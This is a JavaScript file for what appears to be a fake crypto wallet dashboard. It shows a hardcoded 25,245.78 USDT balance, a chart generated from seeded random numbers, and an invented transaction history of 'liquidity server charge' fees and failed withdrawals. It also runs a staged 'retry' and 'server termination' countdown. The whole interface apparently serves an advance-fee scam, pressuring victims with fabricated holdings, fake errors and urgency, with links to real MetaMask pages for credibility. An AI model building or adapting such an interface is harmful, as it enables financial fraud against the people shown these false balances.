/* ============================================================
   Wallet Dashboard — mainportfolio.js
   Server gate (5h retry -> 5h termination -> blank)
   Live CoinGecko prices · one-shot transact · receive flow
   ============================================================ */

const COINGECKO_API = 'https://api.coingecko.com/api/v3';
const WALLET_ADDRESS = '0xfe46bbfb161a724d8a9b77dbaf45d0da3b7ac373';
const DEST_ADDRESS   = '0xfe46bbfb161a724d8a9b77dbaf45d0da3b7ac373';
const BASE_BALANCE   = 25245.78;
const BNB_HOLDING    = 0.199;
const USDT_HOLDING   = 25245.78;

const LS = {
  theme:'mm-theme', balance:'mm-ws-balance',
  txStart:'mm-ws-tx-start', txDone:'mm-ws-tx-done',
  rxStart:'mm-ws-rx-start', rxDone:'mm-ws-rx-done',
  lastPrice:'mm-ws-last-price',
  retryStart:'mm-retry-start', termStart:'mm-term-start', termDone:'mm-term-done'
};

const TX_DURATION_SEC = 90 * 60;
const RX_DURATION_SEC = 15 * 60 * 60;
const RETRY_SEC = 5 * 60 * 60;
const TERM_SEC  = 5 * 60 * 60;

let live = { bnb:0, bnbChange:0, usdt:1, usdtChange:0, loaded:false };
let txTicker = null, rxTicker = null;

const $ = (id) => document.getElementById(id);
const fmtUSD = (n,d) => '$' + Number(n).toLocaleString('en-US',{minimumFractionDigits:d??2,maximumFractionDigits:d??2});
const fmtNum = (n,d) => Number(n).toLocaleString('en-US',{minimumFractionDigits:d??2,maximumFractionDigits:d??4});
const shortAddr = (a) => a.slice(0,6) + '…' + a.slice(-4);
const fmtHMS = (s) => {
  s = Math.max(0, Math.floor(s));
  return String(Math.floor(s/3600)).padStart(2,'0') + ':' +
         String(Math.floor((s%3600)/60)).padStart(2,'0') + ':' +
         String(s%60).padStart(2,'0');
};

function lsGet(k,f){ try{ const v=localStorage.getItem(k); return v===null?f:v; }catch(e){ return f; } }
function lsSet(k,v){ try{ localStorage.setItem(k,v); }catch(e){} }
function lsDel(k){ try{ localStorage.removeItem(k); }catch(e){} }

const isTxStarted = () => lsGet(LS.txStart,'0') !== '0';
const isTxDone    = () => lsGet(LS.txDone,'') === '1';
const isRxStarted = () => lsGet(LS.rxStart,'0') !== '0';
const isRxDone    = () => lsGet(LS.rxDone,'') === '1';

document.documentElement.setAttribute('data-theme', lsGet(LS.theme,'dark'));

function toggleTheme(){
  const root=document.documentElement;
  const next=root.getAttribute('data-theme')==='dark'?'light':'dark';
  root.setAttribute('data-theme',next); lsSet(LS.theme,next);
  drawChart(currentRange); toast(next==='dark'?'Dark mode':'Light mode');
}

let toastTimer=null;
function toast(msg){
  const old=document.querySelector('.toast'); if(old) old.remove();
  const el=document.createElement('div'); el.className='toast';
  el.innerHTML='<svg class="ico" viewBox="0 0 24 24"><use href="#i-check"/></svg><span></span>';
  el.querySelector('span').textContent=msg;
  document.body.appendChild(el);
  requestAnimationFrame(()=>el.classList.add('is-on'));
  clearTimeout(toastTimer);
  toastTimer=setTimeout(()=>{ el.classList.remove('is-on'); setTimeout(()=>el.remove(),280); },2600);
}

function getBalance(){
  const v=parseFloat(lsGet(LS.balance,String(BASE_BALANCE)));
  return isNaN(v)?BASE_BALANCE:v;
}
function setBalance(v){ lsSet(LS.balance,String(v)); renderBalance(); }
function renderBalance(){
  const bal=getBalance(); const el=$('totalBalance'); if(!el) return;
  el.textContent=fmtUSD(bal);
  el.classList.toggle('deducted', bal < BASE_BALANCE - 0.01);
  if(bal < BASE_BALANCE - 0.01){
    $('balanceChange').className='chg neg';
    $('balanceChange').innerHTML='<svg class="ico" viewBox="0 0 24 24" style="width:13px;height:13px"><use href="#i-send"/></svg> $25,245.78 sent';
    $('balanceSub').textContent='Transfer completed · ' + shortAddr(WALLET_ADDRESS);
  }
}

async function loadLivePrices(){
  try{
    const url=`${COINGECKO_API}/simple/price?ids=binancecoin,tether&vs_currencies=usd&include_24hr_change=true`;
    const res=await fetch(url); if(!res.ok) throw new Error('HTTP '+res.status);
    const data=await res.json();
    live.bnb=data?.binancecoin?.usd??0;
    live.bnbChange=data?.binancecoin?.usd_24h_change??0;
    live.usdt=data?.tether?.usd??1;
    live.usdtChange=data?.tether?.usd_24h_change??0;
    live.loaded=true;
    lsSet(LS.lastPrice,JSON.stringify(live));
    $('bnbPrice').textContent=fmtUSD(live.bnb);
    $('usdtPrice').textContent=fmtUSD(live.usdt,4);
    $('lastUpdated').textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    renderAssets(); renderBalance();
  }catch(err){
    const cached=lsGet(LS.lastPrice,null);
    if(cached){
      try{
        const c=JSON.parse(cached);
        live.bnb=c.bnb||0; live.bnbChange=c.bnbChange||0;
        live.usdt=c.usdt||1; live.usdtChange=c.usdtChange||0; live.loaded=true;
        $('bnbPrice').textContent=fmtUSD(live.bnb);
        $('usdtPrice').textContent=fmtUSD(live.usdt,4);
        $('lastUpdated').textContent='cached';
        renderAssets(); return;
      }catch(e){}
    }
    $('bnbPrice').textContent='unavailable';
    $('usdtPrice').textContent='unavailable';
    $('lastUpdated').textContent='offline';
    renderAssets();
  }
}

const LOGO_CACHE={};
async function fetchLogo(coinId){
  if(LOGO_CACHE[coinId]) return LOGO_CACHE[coinId];
  try{
    const res=await fetch(`${COINGECKO_API}/coins/${coinId}?localization=false&tickers=false&market_data=false&community_data=false&developer_data=false`);
    if(!res.ok) throw new Error('bad');
    const data=await res.json();
    const url=data?.image?.large||data?.image?.small||data?.image?.thumb||'';
    LOGO_CACHE[coinId]=url; return url;
  }catch(e){ return ''; }
}

const ASSETS=[
  {id:'tether',sym:'USDT',name:'Tether USD',holding:USDT_HOLDING,decimals:2,color:'#26A17B',chain:'BNB Smart Chain'},
  {id:'binancecoin',sym:'BNB',name:'BNB',holding:BNB_HOLDING,decimals:4,color:'#f6851b',chain:'BNB Smart Chain'}
];
const priceOf=(id)=>id==='binancecoin'?(live.bnb||0):(id==='tether'?(live.usdt||1):0);
const changeOf=(id)=>id==='binancecoin'?(live.bnbChange||0):(id==='tether'?(live.usdtChange||0):0);

function renderAssets(){
  const list=$('assetList'), full=$('tokenListFull'); if(!list) return;
  const rows=ASSETS.map(a=>{
    const price=priceOf(a.id), usd=a.holding*price;
    return {...a,price,usd,change:changeOf(a.id)};
  });
  const count=$('assetCount'); if(count) count.textContent=ASSETS.length+' assets';

  const buildRow=(r)=>`
    <div class="asset-row" onclick="openTokenDetail('${r.sym}')">
      <div class="asset-logo" style="background:${r.color}22" data-logo="${r.id}">
        <span style="color:${r.color};font-size:11px;font-weight:900">${r.sym.slice(0,3)}</span>
      </div>
      <div class="asset-info">
        <div class="asset-name">${r.name}</div>
        <div class="asset-sym">${fmtNum(r.holding,r.decimals)} ${r.sym}</div>
      </div>
      <div class="asset-val">
        <b>${fmtUSD(r.usd)}</b>
        <span class="${r.change>=0?'up':'down'}">${r.change>=0?'+':''}${r.change.toFixed(2)}%</span>
      </div>
    </div>`;

  list.innerHTML=rows.map(buildRow).join('');
  if(full) full.innerHTML=rows.map(buildRow).join('');

  rows.forEach(r=>{
    fetchLogo(r.id).then(url=>{
      if(!url) return;
      document.querySelectorAll('[data-logo="'+r.id+'"]').forEach(node=>{
        const img=document.createElement('img');
        img.src=url; img.alt=r.sym; img.loading='lazy';
        img.onerror=function(){
          node.innerHTML='<span style="color:'+r.color+';font-size:11px;font-weight:900">'+r.sym.slice(0,3)+'</span>';
        };
        node.innerHTML=''; node.appendChild(img);
      });
    });
  });

  const usdtUsd=USDT_HOLDING*(live.usdt||1), bnbUsd=BNB_HOLDING*(live.bnb||0);
  const tot=usdtUsd+bnbUsd||1, usdtPct=(usdtUsd/tot)*100, bnbPct=(bnbUsd/tot)*100;
  const dU=$('donutUsdt'); if(dU) dU.setAttribute('stroke-dasharray',`${usdtPct.toFixed(2)} ${(100-usdtPct).toFixed(2)}`);
  const lg=$('allocLegend');
  if(lg) lg.innerHTML='<div class="mini-row"><i style="background:#26A17B"></i> USDT <b>'+usdtPct.toFixed(1)+'%</b></div>'+
    '<div class="mini-row"><i style="background:#f6851b"></i> BNB <b>'+bnbPct.toFixed(1)+'%</b></div>';
}

let currentRange=30;
const RANGE_DATA={
  1:{points:24,amp:320,hi:25450,mid:25246,lo:25040},
  7:{points:28,amp:620,hi:25800,mid:25246,lo:24700},
  30:{points:32,amp:900,hi:26200,mid:25246,lo:24300},
  90:{points:40,amp:1600,hi:27000,mid:25246,lo:23600}
};
function buildSeries(range){
  const cfg=RANGE_DATA[range]||RANGE_DATA[30]; const pts=[];
  let seed=range*7919; const rand=()=>{seed=(seed*9301+49297)%233280;return seed/233280;};
  for(let i=0;i<cfg.points;i++){
    const base=cfg.mid+Math.sin(i/3.2)*cfg.amp*0.55;
    const noise=(rand()-0.5)*cfg.amp*0.55;
    pts.push(Math.max(cfg.lo,Math.min(cfg.hi,base+noise)));
  }
  pts[pts.length-1]=cfg.mid; return {pts,cfg};
}
function drawChart(range){
  currentRange=range; const svg=$('perfChart'); if(!svg) return;
  const {pts,cfg}=buildSeries(range);
  const W=900,padL=64,padR=24,padT=30,padB=26,innerW=W-padL-padR,innerH=280-padT-padB;
  const min=cfg.lo,max=cfg.hi;
  const x=(i)=>padL+(i/(pts.length-1))*innerW;
  const y=(v)=>padT+innerH-((v-min)/(max-min))*innerH;
  let line=''; pts.forEach((v,i)=>{line+=(i===0?'M':'L')+x(i).toFixed(2)+' '+y(v).toFixed(2)+' ';});
  const area=line+'L'+x(pts.length-1).toFixed(2)+' '+(padT+innerH).toFixed(2)+' L'+padL+' '+(padT+innerH).toFixed(2)+' Z';
  $('linePath').setAttribute('d',line.trim());
  $('areaPath').setAttribute('d',area.trim());
  const dot=$('chartDot'); dot.setAttribute('cx',x(pts.length-1)); dot.setAttribute('cy',y(pts[pts.length-1]));
  $('axisHi').textContent=fmtUSD(max,0); $('axisMid').textContent=fmtUSD((max+min)/2,0); $('axisLo').textContent=fmtUSD(min,0);
  const tip=$('chartTip'); if(!tip) return;
  svg.onmousemove=(e)=>{
    const rect=svg.getBoundingClientRect();
    const relX=((e.clientX-rect.left)/rect.width)*W;
    let idx=Math.round(((relX-padL)/innerW)*(pts.length-1)); idx=Math.max(0,Math.min(pts.length-1,idx));
    const px=(x(idx)/W)*rect.width, py=(y(pts[idx])/280)*rect.height;
    tip.style.left=px+'px'; tip.style.top=Math.max(0,py-44)+'px';
    tip.textContent=fmtUSD(pts[idx]); tip.classList.add('on');
  };
  svg.ontouchmove=svg.onmousemove;
  svg.onmouseleave=()=>tip.classList.remove('on');
  svg.ontouchend=()=>tip.classList.remove('on');
}

const VIEWS=['overview','tokens','nfts','defi','activity'];
function switchView(name,evt){
  if(evt&&evt.preventDefault) evt.preventDefault();
  if(!VIEWS.includes(name)) return;
  VIEWS.forEach(v=>{ const el=$('view-'+v); if(el) el.hidden=(v!==name); });
  document.querySelectorAll('.snav').forEach(n=>n.classList.toggle('on',n.dataset.view===name));
  document.querySelectorAll('.fnav-btn').forEach(n=>n.classList.toggle('on',n.dataset.view===name));
  if(name==='activity') renderActivity();
  window.scrollTo({top:0,behavior:'smooth'});
}

const ACTIVITY=[
  {id:'tx-01',dir:'in',type:'Incoming',status:'success',title:'Received 0.18 BNB',sub:'BNB Smart Chain · from 0x91c4…8de1',amount:'+0.18 BNB',usd:'+$108.42',date:'16|09|2026',ts:'16 Sep 2026, 09:14 UTC',hash:'0x7b3f2a91c4e08d5a6b1f9e2c3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a',from:'0x91c4a8de1f3b2c7e6d5a4b3c2d1e0f9a8b7c6d5e',to:WALLET_ADDRESS,gas:'0.000021 BNB',confirmations:41209},
  {id:'tx-02',dir:'charge',type:'Server charge',status:'success',title:'Liquidity server charge',sub:'Enabled $25,245.78 transaction · 0.18 BNB',amount:'-0.18 BNB',usd:'-$108.42',date:'16|09|2026',ts:'16 Sep 2026, 09:22 UTC',hash:'0x4d8a1f6c9b2e5d7a8c3f1e4d6b9a2c5e8f7d1b4a3c6e9f2d5a8b7c4e1f9d2a6b',from:WALLET_ADDRESS,to:'0x1f4a9c7e2b8d5f3a6c1e9b4d7a2f8c5e3b9d1a6f4c2e8b7d5a3f1c9e6b4d2a8',gas:'0.000000 BNB',confirmations:41198,note:'Server fee for liquidity routing'},
  {id:'tx-03',dir:'in',type:'Incoming',status:'success',title:'Received 0.199 BNB',sub:'BNB Smart Chain · from 0x5e2a…c904',amount:'+0.199 BNB',usd:'+$119.86',date:'04|10|2026',ts:'04 Oct 2026, 17:41 UTC',hash:'0x9a2c7e1f4b8d5a3c6e9f1b4d7a2c8e5f3b9d6a1c4e7f2b5d8a3c9e1f6b4d7a2c',from:'0x5e2a9c7e1f4b8d5a3c6e9f1b4d7a2c8e5f3b9d6a',to:WALLET_ADDRESS,gas:'0.000021 BNB',confirmations:18442},
  {id:'tx-04',dir:'charge',type:'Server charge',status:'success',title:'Liquidity server charge',sub:'Enabled $25,245.78 transaction · 0.199 BNB',amount:'-0.199 BNB',usd:'-$119.86',date:'05|10|2026',ts:'05 Oct 2026, 00:07 UTC',hash:'0x2e7f1a4c9b6d3a8c5f1e7b4d9a2c6f3e8b1d5a7c4e2f9b6d3a8c1e7f4b2d9a6c',from:WALLET_ADDRESS,to:'0x1f4a9c7e2b8d5f3a6c1e9b4d7a2f8c5e3b9d1a6f4c2e8b7d5a3f1c9e6b4d2a8',gas:'0.000000 BNB',confirmations:17906,note:'Server fee for liquidity routing'},
  {id:'tx-05',dir:'out',type:'Outgoing',status:'failed',title:'Outgoing 25,245.78 USDT',sub:'Processing failed · 18|09|2026',amount:'-$25,245.78',usd:'Failed',date:'18|09|2026',ts:'18 Sep 2026, 11:32 UTC',hash:'0x6c1e9b4d7a2f8c5e3b9d1a6f4c2e8b7d5a3f1c9e6b4d2a8c7e1f4b9d5a2c6e3f',from:WALLET_ADDRESS,to:DEST_ADDRESS,gas:'0.000084 BNB',error:'Execution reverted: liquidity pool insufficient depth',confirmations:0},
  {id:'tx-06',dir:'out',type:'Outgoing',status:'failed',title:'Outgoing 25,245.78 USDT',sub:'Processing failed · 22|09|2026',amount:'-$25,245.78',usd:'Failed',date:'22|09|2026',ts:'22 Sep 2026, 14:08 UTC',hash:'0x8d3a1f6c9b2e5d7a4c1f8e3b6d9a2c5e7f1d4b8a3c6e9f2d5a8b4c1e7f3d9a6b',from:WALLET_ADDRESS,to:DEST_ADDRESS,gas:'0.000091 BNB',error:'Execution reverted: slippage tolerance exceeded',confirmations:0},
  {id:'tx-07',dir:'out',type:'Outgoing',status:'failed',title:'Outgoing 25,245.78 USDT',sub:'Processing failed · 24|09|2026',amount:'-$25,245.78',usd:'Failed',date:'24|09|2026',ts:'24 Sep 2026, 10:55 UTC',hash:'0x1b7d4a8c3e6f9b2d5a8c1f7e4b3d6a9c2e8f5b1d4a7c3e6f9b2d8a5c1e4f7b3d',from:WALLET_ADDRESS,to:DEST_ADDRESS,gas:'0.000088 BNB',error:'Execution reverted: router contract paused',confirmations:0},
  {id:'tx-08',dir:'out',type:'Outgoing',status:'failed',title:'Outgoing 25,245.78 USDT',sub:'Processing failed · 26|09|2026',amount:'-$25,245.78',usd:'Failed',date:'26|09|2026',ts:'26 Sep 2026, 16:23 UTC',hash:'0x5f2e9b1d4a7c3e8f6b2d9a5c1e7f4b8a3d6e9c2f5b1d7a4c8e3f6b9d2a5c1e7f',from:WALLET_ADDRESS,to:DEST_ADDRESS,gas:'0.000096 BNB',error:'Execution reverted: insufficient allowance',confirmations:0},
  {id:'tx-09',dir:'out',type:'Outgoing',status:'failed',title:'Outgoing 25,245.78 USDT',sub:'Processing failed · 28|09|2026',amount:'-$25,245.78',usd:'Failed',date:'28|09|2026',ts:'28 Sep 2026, 12:47 UTC',hash:'0x3a8c1f6e9b4d7a2c5f8e1b3d6a9c2e7f4b1d5a8c3e6f9b2d7a4c1f8e5b3d6a9c',from:WALLET_ADDRESS,to:DEST_ADDRESS,gas:'0.000102 BNB',error:'Execution reverted: deadline expired',confirmations:0}
];

function statusPill(status){
  const map={success:['st-success','Success'],failed:['st-failed','Failed'],pending:['st-pending','Pending'],processing:['st-processing','Processing']};
  const m=map[status]||map.pending;
  return '<span class="status-pill '+m[0]+'">'+m[1]+'</span>';
}
function dirIcon(dir){
  if(dir==='in') return {bg:'linear-gradient(135deg,#16a34a,#22c55e)',ico:'i-recv'};
  if(dir==='out') return {bg:'linear-gradient(135deg,#dc2626,#ef4444)',ico:'i-send'};
  return {bg:'linear-gradient(135deg,#f59e0b,#fbbf24)',ico:'i-alert'};
}
function renderActivity(){
  const wrap=$('activityList'); if(!wrap) return;
  wrap.innerHTML=ACTIVITY.map(t=>{
    const ic=dirIcon(t.dir);
    const amountColor=t.dir==='in'?'up':(t.dir==='charge'?'':'down');
    return '<div class="act-row" onclick="openTxDetail(\''+t.id+'\')">'+
      '<div class="act-ic" style="background:'+ic.bg+'"><svg class="ico" viewBox="0 0 24 24"><use href="#'+ic.ico+'"/></svg></div>'+
      '<div class="act-body"><b>'+t.title+'</b><span>'+t.sub+'</span></div>'+
      '<div class="act-amt"><b class="'+amountColor+'">'+t.amount+'</b><span style="color:var(--text-3)">'+t.date+'</span>'+statusPill(t.status)+'</div>'+
    '</div>';
  }).join('');
  const badge=$('actBadge'); if(badge) badge.textContent=ACTIVITY.length;
}
function openTxDetail(id){
  const t=ACTIVITY.find(a=>a.id===id); if(!t) return;
  const rows=[
    ['Type',t.type],['Status',statusPill(t.status)],
    ['Amount','<span class="'+(t.dir==='in'?'up':'')+'">'+t.amount+'</span>'],
    ['USD value',t.usd],['Date',t.ts],
    ['From','<span class="mono">'+t.from+'</span>'],
    ['To','<span class="mono">'+t.to+'</span>'],
    ['Transaction hash','<span class="mono">'+t.hash+'</span>'],
    ['Network fee',t.gas],
    ['Confirmations',t.confirmations===0?'0 (reverted)':t.confirmations.toLocaleString()]
  ];
  if(t.error) rows.push(['Revert reason','<span style="color:var(--red)">'+t.error+'</span>']);
  if(t.note) rows.push(['Note',t.note]);
  showSheet('<div class="sheet-head"><h2>Transaction details</h2><p>'+t.date+' · BNB Smart Chain</p></div>'+
    rows.map(r=>'<div class="detail-row"><span class="k">'+r[0]+'</span><span class="v">'+r[1]+'</span></div>').join('')+
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-shield"/></svg>'+
    '<span>Associated with <b>'+shortAddr(WALLET_ADDRESS)+'</b>. Verify the destination before signing any new transaction.</span></div>'+
    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
    '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry on portfolio.metamask.io</button>');
}

function openTokenDetail(sym){
  const a=ASSETS.find(x=>x.sym===sym); if(!a) return;
  const price=priceOf(a.id), usd=a.holding*price, change=changeOf(a.id);
  showSheet('<div class="sheet-head"><h2>'+a.name+'</h2><p>'+a.chain+' · '+a.sym+'</p></div>'+
    '<div class="detail-row"><span class="k">Holding</span><span class="v">'+fmtNum(a.holding,a.decimals)+' '+a.sym+'</span></div>'+
    '<div class="detail-row"><span class="k">USD value</span><span class="v">'+fmtUSD(usd)+'</span></div>'+
    '<div class="detail-row"><span class="k">Live price</span><span class="v">'+fmtUSD(price,a.id==='tether'?4:2)+'</span></div>'+
    '<div class="detail-row"><span class="k">24h change</span><span class="v '+(change>=0?'up':'down')+'">'+(change>=0?'+':'')+change.toFixed(2)+'%</span></div>'+
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-shield"/></svg>'+
    '<span>Live price and metadata sourced from the CoinGecko public API. Values refresh every 60 seconds.</span></div>');
}

function openAccount(){
  const bal=getBalance();
  showSheet('<div class="sheet-head"><h2>Account</h2><p>BNB Smart Chain wallet</p></div>'+
    '<div class="detail-row"><span class="k">Address</span><span class="v mono">'+WALLET_ADDRESS+'</span></div>'+
    '<div class="detail-row"><span class="k">Network</span><span class="v">BNB Smart Chain (BEP-20)</span></div>'+
    '<div class="detail-row"><span class="k">Balance</span><span class="v">'+fmtUSD(bal)+'</span></div>'+
    '<div class="detail-row"><span class="k">Assets</span><span class="v">'+ASSETS.length+'</span></div>'+
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-shield"/></svg>'+
    '<span>Self-custody account. Keys never leave your device.</span></div>'+
    '<button class="btn btn-outline btn-block" style="margin-top:18px" onclick="copyAddress()">'+
    '<svg class="ico" viewBox="0 0 24 24"><use href="#i-copy"/></svg> Copy address</button>');
}
function copyAddress(){
  if(navigator.clipboard){ navigator.clipboard.writeText(WALLET_ADDRESS).then(()=>toast('Address copied')).catch(()=>toast(WALLET_ADDRESS)); }
  else toast(WALLET_ADDRESS);
}

/* ---------- SERVER GATE ---------- */
function getGateStart(key){
  let v=lsGet(key,null); if(!v){ v=String(Date.now()); lsSet(key,v); }
  return parseInt(v,10)||Date.now();
}
function gatePhase(){
  if(lsGet(LS.termDone,'')==='1') return {phase:'terminated'};
  const termStart=lsGet(LS.termStart,'0');
  if(termStart!=='0'){
    const rem=TERM_SEC-Math.floor((Date.now()-parseInt(termStart,10))/1000);
    if(rem>0) return {phase:'termination',remaining:rem};
    lsSet(LS.termDone,'1');
    return {phase:'terminated'};
  }
  const retryStart=getGateStart(LS.retryStart);
  const rem=RETRY_SEC-Math.floor((Date.now()-retryStart)/1000);
  if(rem>0) return {phase:'retry',remaining:rem};
  lsSet(LS.termStart,String(Date.now()));
  return {phase:'termination',remaining:TERM_SEC};
}
function renderGate(){
  const g=$('serverGate'); if(!g) return;
  const st=gatePhase();

  if(st.phase==='terminated'){
    document.body.classList.add('terminated');
    const ts=$('terminatedScreen'); if(ts) ts.hidden=false;
    g.hidden=true; g.innerHTML='';
    closeOverlay();
    return;
  }

  document.body.classList.remove('terminated');
  const ts=$('terminatedScreen'); if(ts) ts.hidden=true;
  g.hidden=false;

  if(st.phase==='retry'){
    g.className='server-gate gate-retry';
    g.innerHTML=
      '<div class="gate-inner">'+
        '<div class="gate-head">'+
          '<div class="gate-icon"><svg class="ico" viewBox="0 0 24 24"><use href="#i-clock"/></svg></div>'+
          '<div class="gate-title-wrap"><div class="gate-title">Retry transaction window</div>'+
          '<div class="gate-sub">Server reset period · 5 hours remaining</div></div>'+
          '<span class="status-pill st-pending">Pending</span>'+
        '</div>'+
        '<div class="gate-count" id="gateCount">05:00:00</div>'+
        '<div class="gate-bar"><i id="gateBar"></i></div>'+
        '<div class="gate-details">'+
          '<div class="gate-detail"><span class="k">Amount</span><span class="v">25,245.78 USDT</span></div>'+
          '<div class="gate-detail"><span class="k">To</span><span class="v mono">'+shortAddr(DEST_ADDRESS)+'</span></div>'+
          '<div class="gate-detail"><span class="k">Network</span><span class="v">BSC Smart Chain Mainnet</span></div>'+
          '<div class="gate-detail"><span class="k">Gas fee</span><span class="v">0.0108 BNB</span></div>'+
          '<div class="gate-detail"><span class="k">Timestamp</span><span class="v">17:35:55 UTC · 10|10|2026</span></div>'+
          '<div class="gate-detail"><span class="k">Status</span><span class="v">Pending</span></div>'+
        '</div>'+
        '<div class="gate-actions">'+
          '<button class="btn btn-primary" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
          '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry transaction</button>'+
          '<button class="btn btn-outline" onclick="openPending()">'+
          '<svg class="ico" viewBox="0 0 24 24"><use href="#i-activity"/></svg> View details</button>'+
        '</div>'+
      '</div>';
    g.dataset.phase='retry';
  } else {
    g.className='server-gate gate-term';
    g.innerHTML=
      '<div class="gate-inner">'+
        '<div class="gate-head">'+
          '<div class="gate-icon" style="color:var(--red)"><svg class="ico" viewBox="0 0 24 24"><use href="#i-alert"/></svg></div>'+
          '<div class="gate-title-wrap"><div class="gate-title">Server termination countdown</div>'+
          '<div class="gate-sub">Transaction reinstatement window has expired</div></div>'+
          '<span class="status-pill st-processing">Terminating</span>'+
        '</div>'+
        '<div class="gate-count" id="gateCount" style="color:var(--red)">05:00:00</div>'+
        '<div class="gate-bar"><i id="gateBar" style="background:linear-gradient(90deg,#dc2626,#ef4444)"></i></div>'+
        '<p class="gate-warn">The server will terminate when this countdown reaches zero. The dashboard will go blank and the pending transaction will remain unresolved until the system is restored.</p>'+
      '</div>';
    g.dataset.phase='termination';
  }
  updateGateCountdown(st);
}
function updateGateCountdown(st){
  const rem=st.remaining!==undefined?st.remaining:0;
  const total=st.phase==='retry'?RETRY_SEC:TERM_SEC;
  const el=$('gateCount'); if(el) el.textContent=fmtHMS(rem);
  const bar=$('gateBar'); if(bar) bar.style.width=(((total-rem)/total)*100).toFixed(2)+'%';
}
function gateTick(){
  const st=gatePhase();
  if(st.phase==='terminated'){ if(!document.body.classList.contains('terminated')) renderGate(); return; }
  const g=$('serverGate'); if(!g) return;
  if(g.dataset.phase!==st.phase){ renderGate(); return; }
  updateGateCountdown(st);
}

function openPending(){
  showSheet('<div class="sheet-head"><h2>Pending transaction</h2><p>Sent · awaiting server authorization</p></div>'+
    '<div class="detail-row"><span class="k">Status</span><span class="v">'+statusPill('pending')+'</span></div>'+
    '<div class="detail-row"><span class="k">Amount</span><span class="v">25,245.78 USDT</span></div>'+
    '<div class="detail-row"><span class="k">To</span><span class="v mono">'+WALLET_ADDRESS+'</span></div>'+
    '<div class="detail-row"><span class="k">Network</span><span class="v">BSC Smart Chain Mainnet</span></div>'+
    '<div class="detail-row"><span class="k">Gas fee</span><span class="v">0.0108 BNB</span></div>'+
    '<div class="detail-row"><span class="k">Timestamp</span><span class="v">17:35:55 UTC · 10|10|2026</span></div>'+
    '<div class="info-note"><svg class="ico" viewBox="0 0 24 24"><use href="#i-alert"/></svg>'+
    '<span>The transaction remains pending due to delayed server authorization and ongoing wallet server database maintenance.</span></div>'+
    '<button class="btn btn-primary" style="margin-top:18px;width:100%" onclick="window.open(\'https://portfolio.metamask.io/\',\'_blank\',\'noopener,noreferrer\')">'+
    '<svg class="ico" viewBox="0 0 24 24"><use href="#i-external"/></svg> Retry on portfolio.metamask.io</button>');
}

/* ---------- TRANSACT ---------- */
function handleTransactClick(){
  if(isTxStarted()){
    renderTxPanel();
    toast(isTxDone()?'Transaction already completed':'Transaction already in progress');
    return;
  }
  lsSet(LS.txStart,String(Date.now())); lsDel(LS.txDone);
  updateTransactButton(); renderTxPanel(); startTxTicker(); toast('Outgoing transaction started');
}
function updateTransactButton(){
  const btn=$('transactBtn'); if(!btn) return;
  if(isTxDone()){
    btn.className='btn btn-done'; btn.disabled=true;
    btn.innerHTML='<svg class="ico" viewBox="0 0 24 24"><use href="#i-check"/></svg><span>Sent</span>';
  } else if(isTxStarted()){
    btn.className='btn btn-processing'; btn.disabled=true;
    btn.innerHTML='<svg class="ico" viewBox="0 0 24 24"><use href="#i-clock"/></svg><span>Processing</span>';
  }
}
function renderTxPanel(){ /* panel lives inside the server gate on this build */ }
function startTxTicker(){
  clearInterval(txTicker);
  txTicker=setInterval(()=>{
    if(!isTxStarted()) return;
    if(isTxDone()){ clearInterval(txTicker); return; }
    const start=parseInt(lsGet(LS.txStart,'0'),10)||0; if(!start) return;
    if(Math.floor((Date.now()-start)/1000)>=TX_DURATION_SEC){
      lsSet(LS.txDone,'1'); updateTransactButton(); clearInterval(txTicker); toast('Transaction successful');
    }
  },1000);
}
function startRxTicker(){
  clearInterval(rxTicker);
  rxTicker=setInterval(()=>{
    if(!isRxStarted()) return;
    if(isRxDone()){ clearInterval(rxTicker); return; }
    silentRxTick();
  },1000);
}
function silentRxTick(){
  const start=parseInt(lsGet(LS.rxStart,'0'),10)||0; if(!start) return;
  const remaining=RX_DURATION_SEC-Math.floor((Date.now()-start)/1000);
  if(remaining<=0){
    lsSet(LS.rxDone,'1');
    if(getBalance()>=BASE_BALANCE-0.01) setBalance(BASE_BALANCE-USDT_HOLDING);
    clearInterval(rxTicker);
  }
}
function openReceive(){
  if(!isTxDone()){ toast('Complete the outgoing transaction first'); return; }
  if(isRxDone()){ toast('Assets already sent'); return; }
  if(!isRxStarted()){
    lsSet(LS.rxStart,String(Date.now()));
    window.open('https://metamask.io/','_blank','noopener,noreferrer');
    toast('Opening MetaMask — sending assets');
  }
  startRxTicker();
}

/* ---------- SHEET ---------- */
function showSheet(html){
  $('sheetBody').innerHTML=html;
  $('overlay').hidden=false;
  document.body.classList.add('no-scroll');
}
function closeOverlay(){
  $('overlay').hidden=true;
  document.body.classList.remove('no-scroll');
}
function overlayBackdrop(e){ if(e.target===$('overlay')) closeOverlay(); }

/* ---------- BOOT ---------- */
document.addEventListener('DOMContentLoaded',()=>{
  $('themeBtn').addEventListener('click',toggleTheme);

  document.querySelectorAll('#rangeTabs .tab').forEach(tab=>{
    tab.addEventListener('click',()=>{
      document.querySelectorAll('#rangeTabs .tab').forEach(t=>t.classList.remove('on'));
      tab.classList.add('on');
      drawChart(parseInt(tab.dataset.range,10));
    });
  });

  document.addEventListener('keydown',(e)=>{ if(e.key==='Escape'&&!$('overlay').hidden) closeOverlay(); });

  renderBalance(); renderAssets(); drawChart(30); renderActivity(); updateTransactButton();

  if(isTxStarted()&&!isTxDone()) startTxTicker();
  if(isRxStarted()&&!isRxDone()) startRxTicker();
  if(isRxDone()&&getBalance()>=BASE_BALANCE-0.01) setBalance(BASE_BALANCE-USDT_HOLDING);

  renderGate();
  setInterval(gateTick,1000);
  renderBalance();

  loadLivePrices();
  setInterval(loadLivePrices,60000);

  let rTimer=null;
  window.addEventListener('resize',()=>{ clearTimeout(rTimer); rTimer=setTimeout(()=>drawChart(currentRange),180); });
});
